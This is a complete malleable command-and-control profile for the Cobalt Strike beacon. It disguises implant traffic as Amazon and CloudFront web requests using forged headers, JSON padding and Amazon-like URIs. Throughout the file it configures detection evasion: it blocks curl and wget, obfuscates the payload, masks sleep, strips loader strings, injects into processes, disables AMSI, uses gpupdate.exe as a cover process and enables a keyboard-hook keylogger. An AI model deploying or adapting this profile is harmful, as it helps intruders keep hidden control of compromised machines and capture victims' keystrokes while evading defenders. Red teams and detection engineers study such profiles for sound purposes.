#amazon_events profile
#xx0hcd

###Global Options###
set sample_name "amazon_events.profile";

set sleeptime "38500";
set jitter    "27";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36";
set data_jitter "50";

set host_stage "false";

###DNS options###
dns-beacon {
    # Options moved into 'dns-beacon' group in 4.3:
    set dns_idle             "8.8.8.8";
    set dns_max_txt          "220";
    set dns_sleep            "0";
    set dns_ttl              "1";
    set maxdns               "255";
    set dns_stager_prepend   ".wwwds.";
    set dns_stager_subhost   ".e2867.dsca.";
     
    # DNS subhost override options added in 4.3:
    set beacon               "d-bx.";
    set get_A                "d-1ax.";
    set get_AAAA             "d-4ax.";
    set get_TXT              "d-1tx.";
    set put_metadata         "d-1mx";
    set put_output           "d-1ox.";
    set ns_response          "zero";
}

###SMB options###
set pipename "ntsvcs##";
set pipename_stager "scerpc##";
set smb_frame_header "";

###TCP options###
set tcp_port "8000";
set tcp_frame_header "";

###SSH BANNER###
set ssh_banner "Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-1065-aws x86_64)";
set ssh_pipename "SearchTextHarvester##";

###Steal Token
set steal_token_access_mask "11";

###Proxy Options
set tasks_max_size "1048576";
set tasks_proxy_max_size "921600";
set tasks_dns_proxy_max_size "71680";

###SSL Options###
#https-certificate {
#    set keystore "domain001.store";
#    set password "password123";
#}

#code-signer {
    #set keystore "your_keystore.jks";
    #set password "your_password";
    #set alias "server";
#}

###HTTP-Config Block###
http-config {
#    set headers "Server, Content-Type";
#    header "Content-Type" "text/html;charset=UTF-8";
#    header "Server" "nginx";
#
    set trust_x_forwarded_for "false";
    
    set block_useragents "curl*,lynx*,wget*";
}

#set headers_remove "image/x-xbitmap, image/pjpeg, application/vnd";

###HTTP-GET Block###
http-get {

    set uri "/broadcast";
    
    client {

        #header "Host" "d23tl967axkois.cloudfront.net";
        header "Accept" "application/json, text/plain, */*";
        header "Accept-Language" "en-US,en;q=0.5";
        header "Origin" "https://www.amazon.com";
        header "Referer" "https://www.amazon.com";
        header "Sec-Fetch-Dest" "empty";
        header "Sec-Fetch-Mode" "cors";
        header "Sec-Fetch-Site" "cross-site";
        header "Te" "trailers";

	   
    metadata {
        base64;
	
        header "x-amzn-RequestId";

    }

    }

    server {
    
        header "Content-Type" "application/json";
        header "Access-Control-Allow-Origin" "https://www.amazon.com";
        header "Access-Control-Allow-Methods" "GET";
        header "Access-Control-Allow-Credentials" "true";
        header "X-Amz-Version-Id" "null";
        header "Server" "AmazonS3";
        header "X-Cache" "Hit from cloudfront";
 
        output {

            base64;
            
            prepend "
{\"broadcastEventsData\":{
  \"54857e6d-c060-4b3c-914a-87adfcde093e\":{
  \"lcid\":null,
  \"chatStatus\":\"DISABLED\",
  \"isChatEnabled\":false,
  \"isCarouselEnabled\":null,
  \"highlightedSegmentItemId\":\"";
            
            append "\"";
            append "
  },
  \"B07YF1TNL7\":{
    \"promotions\":null,
    \"percentClaimed\":0,
    \"primeAccessType\":null,
    \"endDate\":\"1970-01-01T00:00:00Z\",
    \"primeBenefitSaving\":null,
    \"dealId\":\"2b2f3426\",
    \"percentOff\":15,
    \"state\":\"\",
    \"dealPrice\":{
      \"fractionalValue\":20,
      \"currencySymbol\":\"$\",
      \"wholeValue\":89
    },
    \"dealType\":\"BEST_DEAL\",
    \"listPrice\":{
      \"fractionalValue\":99,
      \"currencySymbol\":\"$\",
      \"wholeValue\":104
      },
      \"primeExclusive\":false
    },
    \"B071CQCBBN\":{
      \"promotions\":null,
      \"percentClaimed\":0,
      \"primeAccessType\":null,
      \"endDate\":\"1970-01-01T00:00:00Z\",
      \"primeBenefitSaving\":null,
      \"dealId\":\"09a7bbc8\",
      \"percentOff\":15,
      \"state\":\"\",
      \"dealPrice\":{
        \"fractionalValue\":99,
        \"currencySymbol\":\"$\",
        \"wholeValue\":84
      },
      \"dealType\":\"BEST_DEAL\",
      \"listPrice\":{
        \"fractionalValue\":99,
        \"currencySymbol\":\"$\",
        \"wholeValue\":99
      },
      \"primeExclusive\":false
    }
  },
  \"throttled\":false
 },
 \"isLiveBadgeEnabled\":null,
 \"liveViewers\":-1,
 \"interactiveEvents\":[
 ],
 \"vods\":null,
 \"hlsUrl\":
 \"https://d22u79neyj432a.cloudfront.net/bfc50dfa-8e10-44b5-ae59-ac26bfc71489/54857e6d-c060-4b3c-914a-87adfcde093e.m3u8\"
  }
 },
 \"version\":\"1.0\"
}";
	  

            print;
        }
    }
}



###HTTP-Post Block###
http-post {
    
    set uri "/1/events/com.amazon.csm.csa.prod";
    #set verb "GET";
    set verb "POST";

    client {

	#header "Host" "unagi.amazon.com";
	header "Accept" "*/*";
	#header "Accept-Language" "en-US,en;q=0.5";
	#header "Content-Type" "text/plain;charset=UTF-8";
	header "Origin" "https://www.amazon.com";
        
        output {
            base64url;
            
            prepend "{\"events\":[{\"data\":{\"schemaId\":\"csa.VideoInteractions.1\",\"application\":\"Retail:Prod:,\"requestId\":\"MBFV82TTQV2JNBKJJ50B\",\"title\":\"Amazon.com. Spend less. Smile more.\",\"subPageType\":\"desktop\",\"session\":{\"id\":\"133-9905055-2677266\"},\"video\":{\"id\":\"";

            append "\"\n";
            append "\"playerMode\":\"INLINE\",\"videoRequestId\":\"MBFV82TTQV2JNBKJJ50B\",\"isAudioOn\":\"false\",\"player\":\"IVS\",\"event\":\"NONE\"}}}}]}";

	    
	    print;
	    
        }

        id {
	    base64url;
            #parameter "id";
            header "x-amz-rid";

        }
    }

    server {
    
        header "Server" "Server";
        header "Content-Type" "application/json";
        header "Connection" "close";
        header "Access-Control-Allow-Origin" "https://www.amazon.com";
        header "Access-Control-Expose-Headers" "x-amzn-RequestId,x-amzn-ErrorType,x-amzn-ErrorMessage,Date";
        header "Access-Control-Allow-Credentials" "true";
        header "Vary" "Origin,Content-Type,Accept-Encoding,X-Amzn-CDN-Cache,X-Amzn-AX-Treatment,User-Agent";
        header "Permissions-Policy" "interest-cohort=()";

        output {
            netbios;	    
	   
	    prepend "\n";
	    prepend "{";
	    
	    append "\n";
	    append "}";

            print;
        }
    }
}



###HTTP-Stager Block###
http-stager {
	set uri_x86 "/1/Events/com.amazon.csm.csa.prod";
	set uri_x64 "/2/events/com.amazon.csm.csa.prod";
    
    client {

        #header "Host" "unagi.amazon.com";
        header "Accept" "*/*";
        header "Accept-Language" "en-US,en;q=0.5";
        header "Connection" "close";
    }
    
    server {
    
    	header "Content-Type" "application/json";
        header "Access-Control-Allow-Origin" "https://www.amazon.com";
        header "Access-Control-Allow-Methods" "GET";
        header "Access-Control-Allow-Credentials" "true";
        header "X-Amz-Version-Id" "null";
        header "Server" "AmazonS3";
        header "X-Cache" "Hit from cloudfront";
    
    	output {
    	
    		print;
    	}
    }
}


###Malleable PE/Stage Block###
stage {
    set checksum        "0";
    set compile_time    "12 Dec 2019 02:52:11";
    set entry_point     "170000";
    #set image_size_x86 "6586368";
    #set image_size_x64 "6586368";
    #set name	        "WWanMM.dll";
    set userwx 	        "false";
    set cleanup	        "true";
    set sleep_mask	"true";
    set stomppe	        "true";
    set obfuscate	"true";
    set rich_header     "";
    
    set sleep_mask "true";
    
    set smartinject "true";
    
    #set allocator "HeapAlloc";
    set magic_mz_x86 "MZRE";
    set magic_mz_x64 "MZAR";
    set magic_pe "EA";

    set module_x86 "wwanmm.dll";
    set module_x64 "wwanmm.dll";

    transform-x86 {
        prepend "\x90\x90\x90";
        strrep "ReflectiveLoader" "";
        strrep "beacon.dll" "";
        }

    transform-x64 {
        prepend "\x90\x90\x90";
        strrep "ReflectiveLoader" "";
        strrep "beacon.x64.dll" "";
        }

    #string "something";
    #data "something";
    #stringw "something"; 
}

###Process Inject Block###
process-inject {

    set allocator "NtMapViewOfSection";
    
    set bof_allocator "VirtualAlloc";
    set bof_reuse_memory "true";

    set min_alloc "16700";

    set userwx "false";  
    
    set startrwx "true";
        
    transform-x86 {
        prepend "\x90\x90\x90";
    }
    transform-x64 {
        prepend "\x90\x90\x90";
    }

    execute {
        #CreateThread;
        #CreateRemoteThread;       

        CreateThread "ntdll.dll!RtlUserThreadStart+0x1000";

        SetThreadContext;

        NtQueueApcThread-s;

        #NtQueueApcThread;

        CreateRemoteThread "kernel32.dll!LoadLibraryA+0x1000";

        CreateRemoteThread;
        RtlCreateUserThread;
    }
}

###Post-Ex Block###
post-ex {

    set spawnto_x86 "%windir%\\syswow64\\gpupdate.exe";
    set spawnto_x64 "%windir%\\sysnative\\gpupdate.exe";

    set obfuscate "true";

    set smartinject "true";

    set amsi_disable "true";
    
    set thread_hint "ntdll.dll!RtlUserThreadStart+0x1000";
    set pipename "DserNamePipe##, PGMessagePipe##, MsFteWds##";
    set keylogger "SetWindowsHookEx";

}
